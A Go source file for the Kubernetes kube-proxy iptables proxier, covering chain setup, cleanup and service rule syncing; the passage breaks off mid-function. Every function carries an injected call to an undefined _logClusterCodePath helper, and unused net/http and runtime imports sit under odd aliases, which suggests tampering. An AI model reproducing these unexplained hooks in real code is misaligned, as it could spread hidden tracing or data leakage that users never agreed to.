package iptables

import (
 "bytes"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "crypto/sha256"
 "encoding/base32"
 "fmt"
 "net"
 "strconv"
 "strings"
 "sync"
 "sync/atomic"
 "time"
 "k8s.io/klog"
 "k8s.io/api/core/v1"
 "k8s.io/apimachinery/pkg/types"
 utilversion "k8s.io/apimachinery/pkg/util/version"
 "k8s.io/apimachinery/pkg/util/wait"
 "k8s.io/client-go/tools/record"
 "k8s.io/kubernetes/pkg/proxy"
 "k8s.io/kubernetes/pkg/proxy/healthcheck"
 "k8s.io/kubernetes/pkg/proxy/metrics"
 utilproxy "k8s.io/kubernetes/pkg/proxy/util"
 "k8s.io/kubernetes/pkg/util/async"
 "k8s.io/kubernetes/pkg/util/conntrack"
 utiliptables "k8s.io/kubernetes/pkg/util/iptables"
 utilnet "k8s.io/kubernetes/pkg/util/net"
 utilsysctl "k8s.io/kubernetes/pkg/util/sysctl"
 utilexec "k8s.io/utils/exec"
)

const (
 iptablesMinVersion                           = utiliptables.MinCheckVersion
 kubeServicesChain         utiliptables.Chain = "KUBE-SERVICES"
 kubeExternalServicesChain utiliptables.Chain = "KUBE-EXTERNAL-SERVICES"
 kubeNodePortsChain        utiliptables.Chain = "KUBE-NODEPORTS"
 kubePostroutingChain      utiliptables.Chain = "KUBE-POSTROUTING"
 KubeMarkMasqChain         utiliptables.Chain = "KUBE-MARK-MASQ"
 KubeMarkDropChain         utiliptables.Chain = "KUBE-MARK-DROP"
 kubeForwardChain          utiliptables.Chain = "KUBE-FORWARD"
)

type IPTablesVersioner interface{ GetVersion() (string, error) }
type KernelCompatTester interface{ IsCompatible() error }

func CanUseIPTablesProxier(iptver IPTablesVersioner, kcompat KernelCompatTester) (bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 minVersion, err := utilversion.ParseGeneric(iptablesMinVersion)
 if err != nil {
  return false, err
 }
 versionString, err := iptver.GetVersion()
 if err != nil {
  return false, err
 }
 version, err := utilversion.ParseGeneric(versionString)
 if err != nil {
  return false, err
 }
 if version.LessThan(minVersion) {
  return false, nil
 }
 if err := kcompat.IsCompatible(); err != nil {
  return false, err
 }
 return true, nil
}

type LinuxKernelCompatTester struct{}

func (lkct LinuxKernelCompatTester) IsCompatible() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 _, err := utilsysctl.New().GetSysctl(sysctlRouteLocalnet)
 return err
}

const sysctlRouteLocalnet = "net/ipv4/conf/all/route_localnet"
const sysctlBridgeCallIPTables = "net/bridge/bridge-nf-call-iptables"

type serviceInfo struct {
 *proxy.BaseServiceInfo
 serviceNameString        string
 servicePortChainName     utiliptables.Chain
 serviceFirewallChainName utiliptables.Chain
 serviceLBChainName       utiliptables.Chain
}

func newServiceInfo(port *v1.ServicePort, service *v1.Service, baseInfo *proxy.BaseServiceInfo) proxy.ServicePort {
 _logClusterCodePath()
 defer _logClusterCodePath()
 info := &serviceInfo{BaseServiceInfo: baseInfo}
 svcName := types.NamespacedName{Namespace: service.Namespace, Name: service.Name}
 svcPortName := proxy.ServicePortName{NamespacedName: svcName, Port: port.Name}
 protocol := strings.ToLower(string(info.Protocol))
 info.serviceNameString = svcPortName.String()
 info.servicePortChainName = servicePortChainName(info.serviceNameString, protocol)
 info.serviceFirewallChainName = serviceFirewallChainName(info.serviceNameString, protocol)
 info.serviceLBChainName = serviceLBChainName(info.serviceNameString, protocol)
 return info
}

type endpointsInfo struct {
 *proxy.BaseEndpointInfo
 protocol  string
 chainName utiliptables.Chain
}

func newEndpointInfo(baseInfo *proxy.BaseEndpointInfo) proxy.Endpoint {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &endpointsInfo{BaseEndpointInfo: baseInfo}
}
func (e *endpointsInfo) Equal(other proxy.Endpoint) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 o, ok := other.(*endpointsInfo)
 if !ok {
  klog.Error("Failed to cast endpointsInfo")
  return false
 }
 return e.Endpoint == o.Endpoint && e.IsLocal == o.IsLocal && e.protocol == o.protocol && e.chainName == o.chainName
}
func (e *endpointsInfo) endpointChain(svcNameString, protocol string) utiliptables.Chain {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if e.protocol != protocol {
  e.protocol = protocol
  e.chainName = servicePortEndpointChainName(svcNameString, protocol, e.Endpoint)
 }
 return e.chainName
}

type Proxier struct {
 endpointsChanges         *proxy.EndpointChangeTracker
 serviceChanges           *proxy.ServiceChangeTracker
 mu                       sync.Mutex
 serviceMap               proxy.ServiceMap
 endpointsMap             proxy.EndpointsMap
 portsMap                 map[utilproxy.LocalPort]utilproxy.Closeable
 endpointsSynced          bool
 servicesSynced           bool
 initialized              int32
 syncRunner               *async.BoundedFrequencyRunner
 iptables                 utiliptables.Interface
 masqueradeAll            bool
 masqueradeMark           string
 exec                     utilexec.Interface
 clusterCIDR              string
 hostname                 string
 nodeIP                   net.IP
 portMapper               utilproxy.PortOpener
 recorder                 record.EventRecorder
 healthChecker            healthcheck.Server
 healthzServer            healthcheck.HealthzUpdater
 precomputedProbabilities []string
 iptablesData             *bytes.Buffer
 existingFilterChainsData *bytes.Buffer
 filterChains             *bytes.Buffer
 filterRules              *bytes.Buffer
 natChains                *bytes.Buffer
 natRules                 *bytes.Buffer
 endpointChainsNumber     int
 nodePortAddresses        []string
 networkInterfacer        utilproxy.NetworkInterfacer
}
type listenPortOpener struct{}

func (l *listenPortOpener) OpenLocalPort(lp *utilproxy.LocalPort) (utilproxy.Closeable, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return openLocalPort(lp)
}

var _ proxy.ProxyProvider = &Proxier{}

func NewProxier(ipt utiliptables.Interface, sysctl utilsysctl.Interface, exec utilexec.Interface, syncPeriod time.Duration, minSyncPeriod time.Duration, masqueradeAll bool, masqueradeBit int, clusterCIDR string, hostname string, nodeIP net.IP, recorder record.EventRecorder, healthzServer healthcheck.HealthzUpdater, nodePortAddresses []string) (*Proxier, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if val, _ := sysctl.GetSysctl(sysctlRouteLocalnet); val != 1 {
  if err := sysctl.SetSysctl(sysctlRouteLocalnet, 1); err != nil {
   return nil, fmt.Errorf("can't set sysctl %s: %v", sysctlRouteLocalnet, err)
  }
 }
 if val, err := sysctl.GetSysctl(sysctlBridgeCallIPTables); err == nil && val != 1 {
  klog.Warning("missing br-netfilter module or unset sysctl br-nf-call-iptables; proxy may not work as intended")
 }
 masqueradeValue := 1 << uint(masqueradeBit)
 masqueradeMark := fmt.Sprintf("%#08x/%#08x", masqueradeValue, masqueradeValue)
 if nodeIP == nil {
  klog.Warning("invalid nodeIP, initializing kube-proxy with 127.0.0.1 as nodeIP")
  nodeIP = net.ParseIP("127.0.0.1")
 }
 if len(clusterCIDR) == 0 {
  klog.Warning("clusterCIDR not specified, unable to distinguish between internal and external traffic")
 } else if utilnet.IsIPv6CIDR(clusterCIDR) != ipt.IsIpv6() {
  return nil, fmt.Errorf("clusterCIDR %s has incorrect IP version: expect isIPv6=%t", clusterCIDR, ipt.IsIpv6())
 }
 healthChecker := healthcheck.NewServer(hostname, recorder, nil, nil)
 isIPv6 := ipt.IsIpv6()
 proxier := &Proxier{portsMap: make(map[utilproxy.LocalPort]utilproxy.Closeable), serviceMap: make(proxy.ServiceMap), serviceChanges: proxy.NewServiceChangeTracker(newServiceInfo, &isIPv6, recorder), endpointsMap: make(proxy.EndpointsMap), endpointsChanges: proxy.NewEndpointChangeTracker(hostname, newEndpointInfo, &isIPv6, recorder), iptables: ipt, masqueradeAll: masqueradeAll, masqueradeMark: masqueradeMark, exec: exec, clusterCIDR: clusterCIDR, hostname: hostname, nodeIP: nodeIP, portMapper: &listenPortOpener{}, recorder: recorder, healthChecker: healthChecker, healthzServer: healthzServer, precomputedProbabilities: make([]string, 0, 1001), iptablesData: bytes.NewBuffer(nil), existingFilterChainsData: bytes.NewBuffer(nil), filterChains: bytes.NewBuffer(nil), filterRules: bytes.NewBuffer(nil), natChains: bytes.NewBuffer(nil), natRules: bytes.NewBuffer(nil), nodePortAddresses: nodePortAddresses, networkInterfacer: utilproxy.RealNetwork{}}
 burstSyncs := 2
 klog.V(3).Infof("minSyncPeriod: %v, syncPeriod: %v, burstSyncs: %d", minSyncPeriod, syncPeriod, burstSyncs)
 proxier.syncRunner = async.NewBoundedFrequencyRunner("sync-runner", proxier.syncProxyRules, minSyncPeriod, syncPeriod, burstSyncs)
 return proxier, nil
}

type iptablesJumpChain struct {
 table       utiliptables.Table
 chain       utiliptables.Chain
 sourceChain utiliptables.Chain
 comment     string
 extraArgs   []string
}

var iptablesJumpChains = []iptablesJumpChain{{utiliptables.TableFilter, kubeExternalServicesChain, utiliptables.ChainInput, "kubernetes externally-visible service portals", []string{"-m", "conntrack", "--ctstate", "NEW"}}, {utiliptables.TableFilter, kubeServicesChain, utiliptables.ChainOutput, "kubernetes service portals", []string{"-m", "conntrack", "--ctstate", "NEW"}}, {utiliptables.TableNAT, kubeServicesChain, utiliptables.ChainOutput, "kubernetes service portals", nil}, {utiliptables.TableNAT, kubeServicesChain, utiliptables.ChainPrerouting, "kubernetes service portals", nil}, {utiliptables.TableNAT, kubePostroutingChain, utiliptables.ChainPostrouting, "kubernetes postrouting rules", nil}, {utiliptables.TableFilter, kubeForwardChain, utiliptables.ChainForward, "kubernetes forwarding rules", nil}}
var iptablesCleanupOnlyChains = []iptablesJumpChain{{utiliptables.TableFilter, kubeServicesChain, utiliptables.ChainInput, "kubernetes service portals", nil}, {utiliptables.TableFilter, kubeServicesChain, utiliptables.ChainOutput, "kubernetes service portals", nil}}

func CleanupLeftovers(ipt utiliptables.Interface) (encounteredError bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, chain := range append(iptablesJumpChains, iptablesCleanupOnlyChains...) {
  args := append(chain.extraArgs, "-m", "comment", "--comment", chain.comment, "-j", string(chain.chain))
  if err := ipt.DeleteRule(chain.table, chain.sourceChain, args...); err != nil {
   if !utiliptables.IsNotFoundError(err) {
    klog.Errorf("Error removing pure-iptables proxy rule: %v", err)
    encounteredError = true
   }
  }
 }
 iptablesData := bytes.NewBuffer(nil)
 if err := ipt.SaveInto(utiliptables.TableNAT, iptablesData); err != nil {
  klog.Errorf("Failed to execute iptables-save for %s: %v", utiliptables.TableNAT, err)
  encounteredError = true
 } else {
  existingNATChains := utiliptables.GetChainLines(utiliptables.TableNAT, iptablesData.Bytes())
  natChains := bytes.NewBuffer(nil)
  natRules := bytes.NewBuffer(nil)
  writeLine(natChains, "*nat")
  for _, chain := range []utiliptables.Chain{kubeServicesChain, kubeNodePortsChain, kubePostroutingChain, KubeMarkMasqChain} {
   if _, found := existingNATChains[chain]; found {
    chainString := string(chain)
    writeBytesLine(natChains, existingNATChains[chain])
    writeLine(natRules, "-X", chainString)
   }
  }
  for chain := range existingNATChains {
   chainString := string(chain)
   if strings.HasPrefix(chainString, "KUBE-SVC-") || strings.HasPrefix(chainString, "KUBE-SEP-") || strings.HasPrefix(chainString, "KUBE-FW-") || strings.HasPrefix(chainString, "KUBE-XLB-") {
    writeBytesLine(natChains, existingNATChains[chain])
    writeLine(natRules, "-X", chainString)
   }
  }
  writeLine(natRules, "COMMIT")
  natLines := append(natChains.Bytes(), natRules.Bytes()...)
  err = ipt.Restore(utiliptables.TableNAT, natLines, utiliptables.NoFlushTables, utiliptables.RestoreCounters)
  if err != nil {
   klog.Errorf("Failed to execute iptables-restore for %s: %v", utiliptables.TableNAT, err)
   encounteredError = true
  }
 }
 iptablesData.Reset()
 if err := ipt.SaveInto(utiliptables.TableFilter, iptablesData); err != nil {
  klog.Errorf("Failed to execute iptables-save for %s: %v", utiliptables.TableFilter, err)
  encounteredError = true
 } else {
  existingFilterChains := utiliptables.GetChainLines(utiliptables.TableFilter, iptablesData.Bytes())
  filterChains := bytes.NewBuffer(nil)
  filterRules := bytes.NewBuffer(nil)
  writeLine(filterChains, "*filter")
  for _, chain := range []utiliptables.Chain{kubeServicesChain, kubeExternalServicesChain, kubeForwardChain} {
   if _, found := existingFilterChains[chain]; found {
    chainString := string(chain)
    writeBytesLine(filterChains, existingFilterChains[chain])
    writeLine(filterRules, "-X", chainString)
   }
  }
  writeLine(filterRules, "COMMIT")
  filterLines := append(filterChains.Bytes(), filterRules.Bytes()...)
  if err := ipt.Restore(utiliptables.TableFilter, filterLines, utiliptables.NoFlushTables, utiliptables.RestoreCounters); err != nil {
   klog.Errorf("Failed to execute iptables-restore for %s: %v", utiliptables.TableFilter, err)
   encounteredError = true
  }
 }
 return encounteredError
}
func computeProbability(n int) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return fmt.Sprintf("%0.5f", 1.0/float64(n))
}
func (proxier *Proxier) precomputeProbabilities(numberOfPrecomputed int) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(proxier.precomputedProbabilities) == 0 {
  proxier.precomputedProbabilities = append(proxier.precomputedProbabilities, "<bad value>")
 }
 for i := len(proxier.precomputedProbabilities); i <= numberOfPrecomputed; i++ {
  proxier.precomputedProbabilities = append(proxier.precomputedProbabilities, computeProbability(i))
 }
}
func (proxier *Proxier) probability(n int) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if n >= len(proxier.precomputedProbabilities) {
  proxier.precomputeProbabilities(n)
 }
 return proxier.precomputedProbabilities[n]
}
func (proxier *Proxier) Sync() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxier.syncRunner.Run()
}
func (proxier *Proxier) SyncLoop() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if proxier.healthzServer != nil {
  proxier.healthzServer.UpdateTimestamp()
 }
 proxier.syncRunner.Loop(wait.NeverStop)
}
func (proxier *Proxier) setInitialized(value bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var initialized int32
 if value {
  initialized = 1
 }
 atomic.StoreInt32(&proxier.initialized, initialized)
}
func (proxier *Proxier) isInitialized() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return atomic.LoadInt32(&proxier.initialized) > 0
}
func (proxier *Proxier) OnServiceAdd(service *v1.Service) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxier.OnServiceUpdate(nil, service)
}
func (proxier *Proxier) OnServiceUpdate(oldService, service *v1.Service) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if proxier.serviceChanges.Update(oldService, service) && proxier.isInitialized() {
  proxier.syncRunner.Run()
 }
}
func (proxier *Proxier) OnServiceDelete(service *v1.Service) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxier.OnServiceUpdate(service, nil)
}
func (proxier *Proxier) OnServiceSynced() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxier.mu.Lock()
 proxier.servicesSynced = true
 proxier.setInitialized(proxier.servicesSynced && proxier.endpointsSynced)
 proxier.mu.Unlock()
 proxier.syncProxyRules()
}
func (proxier *Proxier) OnEndpointsAdd(endpoints *v1.Endpoints) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxier.OnEndpointsUpdate(nil, endpoints)
}
func (proxier *Proxier) OnEndpointsUpdate(oldEndpoints, endpoints *v1.Endpoints) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if proxier.endpointsChanges.Update(oldEndpoints, endpoints) && proxier.isInitialized() {
  proxier.syncRunner.Run()
 }
}
func (proxier *Proxier) OnEndpointsDelete(endpoints *v1.Endpoints) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxier.OnEndpointsUpdate(endpoints, nil)
}
func (proxier *Proxier) OnEndpointsSynced() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxier.mu.Lock()
 proxier.endpointsSynced = true
 proxier.setInitialized(proxier.servicesSynced && proxier.endpointsSynced)
 proxier.mu.Unlock()
 proxier.syncProxyRules()
}
func portProtoHash(servicePortName string, protocol string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 hash := sha256.Sum256([]byte(servicePortName + protocol))
 encoded := base32.StdEncoding.EncodeToString(hash[:])
 return encoded[:16]
}
func servicePortChainName(servicePortName string, protocol string) utiliptables.Chain {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return utiliptables.Chain("KUBE-SVC-" + portProtoHash(servicePortName, protocol))
}
func serviceFirewallChainName(servicePortName string, protocol string) utiliptables.Chain {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return utiliptables.Chain("KUBE-FW-" + portProtoHash(servicePortName, protocol))
}
func serviceLBChainName(servicePortName string, protocol string) utiliptables.Chain {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return utiliptables.Chain("KUBE-XLB-" + portProtoHash(servicePortName, protocol))
}
func servicePortEndpointChainName(servicePortName string, protocol string, endpoint string) utiliptables.Chain {
 _logClusterCodePath()
 defer _logClusterCodePath()
 hash := sha256.Sum256([]byte(servicePortName + protocol + endpoint))
 encoded := base32.StdEncoding.EncodeToString(hash[:])
 return utiliptables.Chain("KUBE-SEP-" + encoded[:16])
}
func (proxier *Proxier) deleteEndpointConnections(connectionMap []proxy.ServiceEndpoint) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, epSvcPair := range connectionMap {
  if svcInfo, ok := proxier.serviceMap[epSvcPair.ServicePortName]; ok && svcInfo.GetProtocol() == v1.ProtocolUDP {
   endpointIP := utilproxy.IPPart(epSvcPair.Endpoint)
   nodePort := svcInfo.GetNodePort()
   var err error
   if nodePort != 0 {
    err = conntrack.ClearEntriesForPortNAT(proxier.exec, endpointIP, nodePort, v1.ProtocolUDP)
   } else {
    err = conntrack.ClearEntriesForNAT(proxier.exec, svcInfo.ClusterIPString(), endpointIP, v1.ProtocolUDP)
   }
   if err != nil {
    klog.Errorf("Failed to delete %s endpoint connections, error: %v", epSvcPair.ServicePortName.String(), err)
   }
   for _, extIP := range svcInfo.ExternalIPStrings() {
    err := conntrack.ClearEntriesForNAT(proxier.exec, extIP, endpointIP, v1.ProtocolUDP)
    if err != nil {
     klog.Errorf("Failed to delete %s endpoint connections for externalIP %s, error: %v", epSvcPair.ServicePortName.String(), extIP, err)
    }
   }
  }
 }
}

const endpointChainsNumberThreshold = 1000

func (proxier *Proxier) appendServiceCommentLocked(args []string, svcName string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if proxier.endpointChainsNumber > endpointChainsNumberThreshold {
  return
 }
 args = append(args, "-m", "comment", "--comment", svcName)
}
func (proxier *Proxier) syncProxyRules() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 proxier.mu.Lock()
 defer proxier.mu.Unlock()
 start := time.Now()
 defer func() {
  metrics.SyncProxyRulesLatency.Observe(metrics.SinceInMicroseconds(start))
  klog.V(4).Infof("syncProxyRules took %v", time.Since(start))
 }()
 if !proxier.endpointsSynced || !proxier.servicesSynced {
  klog.V(2).Info("Not syncing iptables until Services and Endpoints have been received from master")
  return
 }
 serviceUpdateResult := proxy.UpdateServiceMap(proxier.serviceMap, proxier.serviceChanges)
 endpointUpdateResult := proxy.UpdateEndpointsMap(proxier.endpointsMap, proxier.endpointsChanges)
 staleServices := serviceUpdateResult.UDPStaleClusterIP
 for _, svcPortName := range endpointUpdateResult.StaleServiceNames {
  if svcInfo, ok := proxier.serviceMap[svcPortName]; ok && svcInfo != nil && svcInfo.GetProtocol() == v1.ProtocolUDP {
   klog.V(2).Infof("Stale udp service %v -> %s", svcPortName, svcInfo.ClusterIPString())
   staleServices.Insert(svcInfo.ClusterIPString())
   for _, extIP := range svcInfo.ExternalIPStrings() {
    staleServices.Insert(extIP)
   }
  }
 }
 klog.V(3).Info("Syncing iptables rules")
 for _, chain := range iptablesJumpChains {
  if _, err := proxier.iptables.EnsureChain(chain.table, chain.chain); err != nil {
   klog.Errorf("Failed to ensure that %s chain %s exists: %v", chain.table, kubeServicesChain, err)
   return
  }
  args := append(chain.extraArgs, "-m", "comment", "--comment", chain.comment, "-j", string(chain.chain))
  if _, err := proxier.iptables.EnsureRule(utiliptables.Prepend, chain.table, chain.sourceChain, args...); err != nil {
   klog.Errorf("Failed to ensure that %s chain %s jumps to %s: %v", chain.table, chain.sourceChain, chain.chain, err)
   return
  }
 }
 existingFilterChains := make(map[utiliptables.Chain][]byte)
 proxier.existingFilterChainsData.Reset()
 err := proxier.iptables.SaveInto(utiliptables.TableFilter, proxier.existingFilterChainsData)
 if err != nil {
  klog.Errorf("Failed to execute iptables-save, syncing all rules: %v", err)
 } else {
  existingFilterChains = utiliptables.GetChainLines(utiliptables.TableFilter, proxier.existingFilterChainsData.Bytes())
 }
 existingNATChains := make(map[utiliptables.Chain][]byte)
 proxier.iptablesData.Reset()
 err = proxier.iptables.SaveInto(utiliptables.TableNAT, proxier.iptablesData)
 if err != nil {
  klog.Errorf("Failed to execute iptables-save, syncing all rules: %v", err)
 } else {
  existingNATChains = utiliptables.GetChainLines(utiliptables.TableNAT, proxier.iptablesData.Bytes())
 }
 proxier.filterChains.Reset()
 proxier.filterRules.Reset()
 proxier.natChains.Reset()
 proxier.natRules.Reset()
 writeLine(proxier.filterChains, "*filter")
 writeLine(proxier.natChains, "*nat")
 for _, chainName := range []utiliptables.Chain{kubeServicesChain, kubeExternalServicesChain, kubeForwardChain} {
  if chain, ok := existingFilterChains[chainName]; ok {
   writeBytesLine(proxier.filterChains, chain)
  } else {
   writeLine(proxier.filterChains, utiliptables.MakeChainLine(chainName))
  }
 }
 for _, chainName := range []utiliptables.Chain{kubeServicesChain, kubeNodePortsChain, kubePostroutingChain, KubeMarkMasqChain} {
  if chain, ok := existingNATChains[chainName]; ok {
   writeBytesLine(proxier.natChains, chain)
  } else {
   writeLine(proxier.natChains, utiliptables.MakeChainLine(chainName))
  }
 }
 writeLine(proxier.natRules, []string{"-A", string(kubePostroutingChain), "-m", "comment", "--comment", `"kubernetes service traffic requiring SNAT"`, "-m", "mark", "--mark", proxier.masqueradeMark, "-j", "MASQUERADE"}...)
 writeLine(proxier.natRules, []string{"-A", string(KubeMarkMasqChain), "-j", "MARK", "--set-xmark", proxier.masqueradeMark}...)
 activeNATChains := map[utiliptables.Chain]bool{}
 replacementPortsMap := map[utilproxy.LocalPort]utilproxy.Closeable{}
 endpoints := make([]*endpointsInfo, 0)
 endpointChains := make([]utiliptables.Chain, 0)
 args := make([]string, 64)
 proxier.endpointChainsNumber = 0
 for svcName := range proxier.serviceMap {
  proxier.endpointChainsNumber += len(proxier.endpointsMap[svcName])
 }
 for svcName, svc := range proxier.serviceMap {
  svcInfo, ok := svc.(*serviceInfo)
  if !ok {
   klog.Errorf("Failed to cast serviceInfo %q", svcName.String())
   continue
  }
  isIPv6 := utilnet.IsIPv6(svcInfo.ClusterIP)
  protocol := strings.ToLower(string(svcInfo.Protocol))
  svcNameString := svcInfo.serviceNameString
  hasEndpoints := len(proxier.endpointsMap[svcName]) > 0
  svcChain := svcInfo.servicePortChainName
  if hasEndpoints {
   if chain, ok := existingNATChains[svcChain]; ok {
    writeBytesLine(proxier.natChains, chain)
   } else {
    writeLine(proxier.natChains, utiliptables.MakeChainLine(svcChain))
   }
   activeNATChains[svcChain] = true
  }
  svcXlbChain := svcInfo.serviceLBChainName
  if svcInfo.OnlyNodeLocalEndpoints {
   if lbChain, ok := existingNATChains[svcXlbChain]; ok {
    writeBytesLine(proxier.natChains, lbChain)
   } else {
    writeLine(proxier.natChains, utiliptables.MakeChainLine(svcXlbChain))
   }
   activeNATChains[svcXlbChain] = true
  }
  if hasEndpoints {
   args = append(args[:0], "-A", string(kubeServicesChain), "-m", "comment", "--comment", fmt.Sprintf(`"%s cluster IP"`, svcNameString), "-m", protocol, "-p", protocol, "-d", utilproxy.ToCIDR(svcInfo.ClusterIP), "--dport", strconv.Itoa(svcInfo.Port))
   if proxier.masqueradeAll {
    writeLine(proxier.natRules, append(args, "-j", string(KubeMarkMasqChain))...)
   } else if len(proxier.clusterCIDR) > 0 {
    writeLine(proxier.natRules, append(args, "! -s", proxier.clusterCIDR, "-j", string(KubeMarkMasqChain))...)
   }
   writeLine(proxier.natRules, append(args, "-j", string(svcChain))...)
  } else {
   writeLine(proxier.filterRules, "-A", string(kubeServicesChain), "-m", "comment", "--comment", fmt.Sprintf(`"%s has no endpoints"`, svcNameString), "-m", protocol, "-p", protocol, "-d", utilproxy.ToCIDR(svcInfo.ClusterIP), "--dport", strconv.Itoa(svcInfo.Port), "-j", "REJECT")
  }
  for _, externalIP := range svcInfo.ExternalIPs {
   if local, err := utilproxy.IsLocalIP(externalIP); err != nil {
    klog.Errorf("can't determine if IP is local, assuming not: %v", err)
   } else if local && (svcInfo.GetProtocol() != v1.ProtocolSCTP) {
    lp := utilproxy.LocalPort{Description: "externalIP for " + svcNameString, IP: externalIP, Port: svcInfo.Port, Protocol: protocol}
    if proxier.portsMap[lp] != nil {
     klog.V(4).Infof("Port %s was open before and is still needed", lp.String())
     replacementPortsMap[lp] = proxier.portsMap[lp]
    } else {
     socket, err := proxier.portMapper.OpenLocalPort(&lp)
     if err != nil {
      msg := fmt.Sprintf("can't open %s, skipping this externalIP: %v", lp.String(), err)
      proxier.recorder.Eventf(&v1.ObjectReference{Kind: "Node", Name: proxier.hostname, UID: types.UID(proxier.hostname), Namespace: ""}, v1.EventTypeWarning, err.Error(), msg)
      klog.Error(msg)
      continue
     }
     replacementPortsMap[lp] = socket
    }
   }
   if hasEndpoints {
    args = append(args[:0], "-A", string(kubeServicesChain), "-m", "comment", "--comment", fmt.Sprintf(`"%s external IP"`, svcNameString), "-m", protocol, "-p", protocol, "-d", utilproxy.ToCIDR(net.ParseIP(externalIP)), "--dport", strconv.Itoa(svcInfo.Port))
    writeLine(proxier.natRules, append(args, "-j", string(KubeMarkMasqChain))...)
    externalTrafficOnlyArgs := append(args, "-m", "physdev", "!", "--physdev-is-in", "-m", "addrtype", "!", "--src-type", "LOCAL")
    writeLine(proxier.natRules, append(externalTrafficOnlyArgs, "-j", string(svcChain))...)
    dstLocalOnlyArgs := append(args, "-m", "addrtype", "--dst-type", "LOCAL")
    writeLine(proxier.natRules, append(dstLocalOnlyArgs, "-j", string(svcChain))...)
   } else {
    writeLine(proxier.filterRules, "-A", string(kubeExternalServicesChain), "-m", "comment", "--comment", fmt.Sprintf(`"%s has no endpoints"`, svcNameString), "-m", protocol, "-p", protocol, "-d", utilproxy.ToCIDR(net.ParseIP(externalIP)), "--dport", strconv.Itoa(svcInfo.Port), "-j", "REJECT")
   }
  }
  if hasEndpoints {
   fwChain := svcInfo.serviceFirewallChainName
   for _, ingress := range svcInfo.LoadBalancerStatus.Ingress {
    if ingress.IP != "" {
     if chain, ok := existingNATChains[fwChain]; ok {
      writeBytesLine(proxier.natChains, chain)
     } else {
      writeLine(proxier.natChains, utiliptables.MakeChainLine(fwChain))
     }
     activeNATChains[fwChain] = true
     args = append(args[:0], "-A", string(kubeServicesChain), "-m", "comment", "--comment", fmt.Sprintf(`"%s loadbalancer IP"`, svcNameString), "-m", protocol, "-p", protocol, "-d", utilproxy.ToCIDR(net.ParseIP(ingress.IP)), "--dport", strconv.Itoa(svcInfo.Port))
     writeLine(proxier.natRules, append(args, "-j", string(fwChain))...)
     args = append(args[:0], "-A", string(fwChain), "-m", "comment", "--comment", fmt.Sprintf(`"%s loadbalancer IP"`, svcNameString))
     chosenChain := svcXlbChain
     if !svcInfo.OnlyNodeLocalEndpoints {
      writeLine(proxier.natRules, append(args, "-j", string(KubeMarkMasqChain))...)
      chosenChain = svcChain
     }
     if len(svcInfo.LoadBalancerSourceRanges) == 0 {
      writeLine(proxier.natRules, append(args, "-j", string(chosenChain))...)
     } else {
      allowFromNode := false
      for _, src := range svcInfo.LoadBalancerSourceRanges {
       writeLine(proxier.natRules, append(args, "-s", src, "-j", string(chosenChain))...)
       _, cidr, _ := net.ParseCIDR(src)
       if cidr.Contains(proxier.nodeIP) {
        allowFromNode = true
       }
      }
      if allowFromNode {
       writeLine(proxier.natRules, append(args, "-s", utilproxy.ToCIDR(net.ParseIP(ingress.IP)), "-j", string(chosenChain))...)
      }
     }
     writeLine(proxier.natRules, append(args, "-j", string(KubeMarkDropChain))...)
    }
   }
  }
  if svcInfo.NodePort != 0 {
   addresses, err := utilproxy.GetNodeAddresses(proxier.nodePortAddresses, proxier.networkInterfacer)
   if err != nil {
    klog.Errorf("Failed to get node ip address matching nodeport cidr: %v", err)
    continue
   }
   lps := make([]utilproxy.LocalPort, 0)
   for address := range addresses {
    lp := utilproxy.LocalPort{Description: "nodePort for " + svcNameString, IP: address, Port: svcInfo.NodePort, Protocol: protocol}
    if utilproxy.IsZeroCIDR(address) {
     lp.IP = ""
     lps = append(lps, lp)
     break
    }
    lps = append(lps, lp)
   }
   for _, lp := range lps {
    if proxier.portsMap[lp] != nil {
     klog.V(4).Infof("Port %s was open before and is still needed", lp.String())
     replacementPortsMap[lp] = proxier.portsMap[lp]
    } else if svcInfo.GetProtocol() != v1.ProtocolSCTP {
     socket, err := proxier.portMapper.OpenLocalPort(&lp)
     if err != nil {
      klog.Errorf("can't open %s, skipping this nodePort: %v", lp.String(), err)
      continue
     }
     if lp.Protocol == "udp" {
      err := conntrack.ClearEntriesForPort(proxier.exec, lp.Port, isIPv6, v1.ProtocolUDP)
      if err != nil {
       klog.Errorf("Failed to clear udp conntrack for port %d, error: %v", lp.Port, err)
      }
     }
     replacementPortsMap[lp] = socket
    }
   }
   if hasEndpoints {
    args = append(args[:0], "-A", string(kubeNodePortsChain), "-m", "comment", "--comment", svcNameString, "-m", protocol, "-p", protocol, "--dport", strconv.Itoa(svcInfo.NodePort))
    if !svcInfo.OnlyNodeLocalEndpoints {
     writeLine(proxier.natRules, append(args, "-j", string(KubeMarkMasqChain))...)
     writeLine(proxier.natRules, append(args, "-j", string(svcChain))...)
    } else {
     loopback := "127.0.0.0/8"
     if isIPv6 {
